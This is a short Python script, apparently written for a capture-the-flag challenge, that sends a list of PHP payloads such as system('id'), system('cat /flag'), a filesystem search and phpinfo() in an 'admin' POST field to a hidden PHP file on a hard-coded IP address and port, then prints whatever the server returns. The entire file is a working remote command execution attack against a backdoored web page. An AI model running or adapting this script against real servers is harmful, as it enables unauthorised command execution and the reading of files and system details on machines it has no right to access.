#!/usr/bin/env python3
import requests

url = 'http://61.147.171.35:62218/s3Cr37_f1L3.php'

# 尝试执行命令
commands = [
    'system("id");',
    'system("ls -la");',
    'system("cat /flag");',
    'system("cat /flag.txt");',
    'system("cat flag");',
    'system("cat flag.txt");',
    'system("find / -name *flag* 2>/dev/null | head -20");',
    'system("ls /");',
    'phpinfo();',
]

for cmd in commands:
    print(f'[*] Trying: {cmd}')
    r = requests.post(url, data={'admin': cmd})
    if 'Not Found' not in r.text and r.text.strip():
        print(f'Response:\n{r.text}')
    else:
        print('No output or 404')
    print('-' * 50)
